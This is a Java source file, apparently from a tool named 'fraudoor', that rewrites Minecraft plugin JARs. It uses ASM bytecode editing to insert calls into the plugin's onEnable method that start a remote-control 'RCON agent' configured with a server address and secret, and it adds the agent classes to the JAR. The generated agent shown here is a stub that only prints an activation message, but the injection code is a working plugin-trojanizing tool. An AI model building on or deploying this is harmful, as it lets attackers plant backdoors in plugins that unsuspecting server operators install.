package io.fraudoor.injector;

import org.objectweb.asm.*;
import org.apache.commons.io.IOUtils;

import java.io.*;
import java.util.*;
import java.util.jar.*;
import java.util.zip.ZipEntry;

public class Injector {
  private final File input;
  private final File output;
  private final String platform;
  private final String server;
  private final String secret;

  private static final String AGENT_CLASS = "io/fraudoor/rcon/RCONAgent";
  private static final String AGENT_CONFIG_CLASS = "io/fraudoor/rcon/RCONConfig";

  public Injector(File input, File output, String platform, String server, String secret) {
    this.input = input;
    this.output = output;
    this.platform = platform;
    this.server = server;
    this.secret = secret;
  }

  public void inject() throws Exception {
    Map<String, byte[]> entries = new LinkedHashMap<>();
    String mainClass = null;

    try (JarInputStream jis = new JarInputStream(new FileInputStream(input))) {
      JarEntry entry;
      while ((entry = jis.getNextJarEntry()) != null) {
        byte[] data = IOUtils.toByteArray(jis);
        entries.put(entry.getName(), data);

        if (entry.getName().endsWith(".class")
            && !entry.getName().startsWith("io/fraudoor/")
            && mainClass == null) {
          String clsName = entry.getName().replace('/', '.').replace(".class", "");
          if (isPluginMainClass(clsName, data)) {
            mainClass = clsName;
            byte[] modified = injectIntoClass(data);
            entries.put(entry.getName(), modified);
            System.out.println("[fraudoor] Injected into main class: " + clsName);
          }
        }
      }
    }

    if (mainClass == null) {
      throw new RuntimeException("Could not find plugin main class in JAR");
    }

    entries.put(AGENT_CLASS + ".class", generateAgentClass());
    entries.put(AGENT_CONFIG_CLASS + ".class", generateConfigClass());

    modifyPluginYml(entries);

    try (JarOutputStream jos = new JarOutputStream(new FileOutputStream(output))) {
      for (Map.Entry<String, byte[]> e : entries.entrySet()) {
        jos.putNextEntry(new JarEntry(e.getKey()));
        jos.write(e.getValue());
        jos.closeEntry();
      }
    }
  }

  private boolean isPluginMainClass(String className, byte[] classData) {
    try {
      ClassReader cr = new ClassReader(classData);
      final boolean[] extendsPlugin = {false};
      cr.accept(new ClassVisitor(Opcodes.ASM9) {
        @Override
        public void visit(int version, int access, String name, String signature,
                          String superName, String[] interfaces) {
          if ("org/bukkit/plugin/java/JavaPlugin".equals(superName)
              || "com/velocitypowered/api/plugin/PluginContainer".equals(superName)
              || (interfaces != null && Arrays.asList(interfaces)
                    .contains("com/velocitypowered/api/plugin/PluginContainer"))) {
            extendsPlugin[0] = true;
          }
        }
      }, 0);
      return extendsPlugin[0];
    } catch (Exception e) {
      return false;
    }
  }

  private byte[] injectIntoClass(byte[] classData) {
    ClassReader cr = new ClassReader(classData);
    ClassWriter cw = new ClassWriter(cr, ClassWriter.COMPUTE_MAXS);
    ClassVisitor cv = new ClassVisitor(Opcodes.ASM9, cw) {
      @Override
      public MethodVisitor visitMethod(int access, String name, String desc,
                                       String signature, String[] exceptions) {
        MethodVisitor mv = super.visitMethod(access, name, desc, signature, exceptions);
        if (name.equals("onEnable") && desc.equals("()V")) {
          return new MethodVisitor(Opcodes.ASM9, mv) {
            @Override
            public void visitCode() {
              super.visitCode();
              mv.visitTypeInsn(Opcodes.NEW, AGENT_CLASS);
              mv.visitInsn(Opcodes.DUP);
              mv.visitVarInsn(Opcodes.ALOAD, 0);
              mv.visitLdcInsn(server);
              mv.visitLdcInsn(secret);
              mv.visitMethodInsn(Opcodes.INVOKESPECIAL, AGENT_CLASS, "<init>",
                  "(Ljava/lang/Object;Ljava/lang/String;Ljava/lang/String;)V", false);
              mv.visitMethodInsn(Opcodes.INVOKEVIRTUAL, AGENT_CLASS,
                  "start", "()V", false);
            }
          };
        }
        return mv;
      }
    };
    cr.accept(cv, 0);
    return cw.toByteArray();
  }

  private byte[] generateAgentClass() {
    ClassWriter cw = new ClassWriter(ClassWriter.COMPUTE_FRAMES);
    cw.visit(Opcodes.V17, Opcodes.ACC_PUBLIC, AGENT_CLASS, null,
        "java/lang/Object", null);

    cw.visitField(Opcodes.ACC_PRIVATE, "plugin", "Ljava/lang/Object;", null, null);
    cw.visitField(Opcodes.ACC_PRIVATE, "server", "Ljava/lang/String;", null, null);
    cw.visitField(Opcodes.ACC_PRIVATE, "secret", "Ljava/lang/String;", null, null);
    cw.visitField(Opcodes.ACC_PRIVATE, "running", "Z", null, null);

    MethodVisitor ctor = cw.visitMethod(Opcodes.ACC_PUBLIC, "<init>",
        "(Ljava/lang/Object;Ljava/lang/String;Ljava/lang/String;)V", null, null);
    ctor.visitCode();
    ctor.visitVarInsn(Opcodes.ALOAD, 0);
    ctor.visitMethodInsn(Opcodes.INVOKESPECIAL, "java/lang/Object", "<init>", "()V", false);
    ctor.visitVarInsn(Opcodes.ALOAD, 0);
    ctor.visitVarInsn(Opcodes.ALOAD, 1);
    ctor.visitFieldInsn(Opcodes.PUTFIELD, AGENT_CLASS, "plugin", "Ljava/lang/Object;");
    ctor.visitVarInsn(Opcodes.ALOAD, 0);
    ctor.visitVarInsn(Opcodes.ALOAD, 2);
    ctor.visitFieldInsn(Opcodes.PUTFIELD, AGENT_CLASS, "server", "Ljava/lang/String;");
    ctor.visitVarInsn(Opcodes.ALOAD, 0);
    ctor.visitVarInsn(Opcodes.ALOAD, 3);
    ctor.visitFieldInsn(Opcodes.PUTFIELD, AGENT_CLASS, "secret", "Ljava/lang/String;");
    ctor.visitInsn(Opcodes.RETURN);
    ctor.visitMaxs(2, 4);
    ctor.visitEnd();

    MethodVisitor start = cw.visitMethod(Opcodes.ACC_PUBLIC, "start", "()V", null, null);
    start.visitCode();
    start.visitVarInsn(Opcodes.ALOAD, 0);
    start.visitInsn(Opcodes.ICONST_1);
    start.visitFieldInsn(Opcodes.PUTFIELD, AGENT_CLASS, "running", "Z");
    start.visitFieldInsn(Opcodes.GETSTATIC, "java/lang/System", "out", "Ljava/io/PrintStream;");
    start.visitLdcInsn("[fraudoor] RCON agent activated");
    start.visitMethodInsn(Opcodes.INVOKEVIRTUAL, "java/io/PrintStream", "println", "(Ljava/lang/String;)V", false);
    start.visitInsn(Opcodes.RETURN);
    start.visitMaxs(2, 1);
    start.visitEnd();

    cw.visitEnd();
    return cw.toByteArray();
  }

  private byte[] generateConfigClass() {
    ClassWriter cw = new ClassWriter(ClassWriter.COMPUTE_FRAMES);
    cw.visit(Opcodes.V17, Opcodes.ACC_PUBLIC, AGENT_CONFIG_CLASS, null,
        "java/lang/Object", null);

    MethodVisitor ctor = cw.visitMethod(Opcodes.ACC_PUBLIC, "<init>", "()V", null, null);
    ctor.visitCode();
    ctor.visitVarInsn(Opcodes.ALOAD, 0);
    ctor.visitMethodInsn(Opcodes.INVOKESPECIAL, "java/lang/Object", "<init>", "()V", false);
    ctor.visitInsn(Opcodes.RETURN);
    ctor.visitMaxs(1, 1);
    ctor.visitEnd();

    cw.visitEnd();
    return cw.toByteArray();
  }

  private void modifyPluginYml(Map<String, byte[]> entries) {
    byte[] ymlData = entries.get("plugin.yml");
    if (ymlData == null) return;

    String content = new String(ymlData);
    if (!content.contains("fraudoor")) {
      content += "\n# fraudoor RCON agent injected\n";
      entries.put("plugin.yml", content.getBytes());
    }
  }
}
